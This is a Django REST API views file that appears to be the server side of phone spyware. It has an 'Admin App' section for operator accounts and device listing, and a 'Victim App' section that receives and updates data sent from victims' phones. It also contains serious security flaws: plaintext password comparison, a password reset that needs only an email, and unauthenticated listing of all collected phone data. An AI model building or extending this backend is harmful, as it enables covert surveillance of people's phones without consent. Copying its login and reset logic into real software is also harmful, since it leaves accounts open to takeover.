from rest_framework.views import APIView
from rest_framework.response import Response
from rest_framework import status
from .seriallizers import Userserializers,Phonedataserializers,Forgetserializers
from .models import User,Phonedata
from django.http import JsonResponse
from rest_framework.decorators import api_view

# Admin App api

class List_user(APIView):
    def get(self, request):
        users = Phonedata.objects.all()
        serializer = Phonedataserializers(users, many=True)
        return Response(serializer.data)


class Create_user(APIView):
    def post(self, request):
        serializer = Userserializers(data=request.data)
        email = request.data['email']
        if serializer.is_valid():
            if User.objects.filter(email=email).exists():
                return JsonResponse({'data': 'Email already exists'})
            else:
                serializer.save()
                return JsonResponse({'data': serializer.data})

class Login(APIView):
    def post(self, request):
        email = request.data['email']
        password = request.data['password']
        users = User.objects.all().filter(email=email)
        serializer = Userserializers(users, many=True)
        if serializer.data[0]['password'] == password:
            return JsonResponse({'data': 'Login successful'})
        else:
            return JsonResponse({'data': 'Invalid credentials'})



class Forget(APIView):
    def post(self, request):
        email = request.data['email']
        newpassword = User.objects.get(email=email)
        serializer = Forgetserializers(instance=newpassword, data=request.data)
        if serializer.is_valid():
            serializer.save()
        return JsonResponse({'status':status.HTTP_200_OK})



class Get_All_device(APIView):
    def post(self, request):
         phons = Phonedata.objects.all().filter(email = request.data['email'])
         serializer = Phonedataserializers(phons, many=True)
         return JsonResponse({'data': serializer.data})

# Victim App Api
class Phone_data_created(APIView):
    def post(self, request):
        serializer = Phonedataserializers(data=request.data)
        email = request.data['email']
        if serializer.is_valid():
            if User.objects.filter(email=email).exists():
                serializer.save()
                return JsonResponse({'status':status.HTTP_200_OK,'id': serializer.data['id']})
            else:
                return JsonResponse({'status': 'Email not found'})

class Phone_data_Update(APIView):
    def post(self, request, pk):
        phonedb = Phonedata.objects.get(id=pk)
        serializer = Phonedataserializers(instance=phonedb, data=request.data)
        if serializer.is_valid():
            serializer.save()
        return Response(serializer.data)


